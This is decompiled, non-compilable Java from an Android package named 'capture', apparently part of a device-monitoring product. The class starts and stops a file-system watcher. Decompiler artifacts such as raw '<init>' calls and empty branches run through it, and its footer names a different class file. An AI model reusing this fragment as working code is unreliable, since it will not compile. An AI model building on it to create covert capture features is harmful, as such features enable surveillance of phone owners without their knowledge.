package com.vvt.capture.f.a;

import android.content.Context;

public class c
  extends a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private d c;
  private Object d;
  
  public c(com.vvt.capture.f.a parama)
  {
    super(parama);
    Object localObject = new java/lang/Object;
    localObject.<init>();
    this.d = localObject;
  }
  
  public void a(Context paramContext)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject = this.c;
    if (localObject == null)
    {
      localObject = b.a();
      boolean bool2 = b;
      if (bool2) {}
      d locald = new com/vvt/capture/f/a/d;
      int i = 392;
      locald.<init>(this, (String)localObject, i);
      this.c = locald;
      bool1 = b;
      if (bool1) {}
      localObject = this.c;
      ((d)localObject).startWatching();
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return;
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  public void b(Context paramContext)
  {
    boolean bool = b;
    if (bool) {}
    d locald = this.c;
    if (locald != null)
    {
      bool = b;
      if (bool) {}
      locald = this.c;
      locald.stopWatching();
    }
    locald = null;
    this.c = null;
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */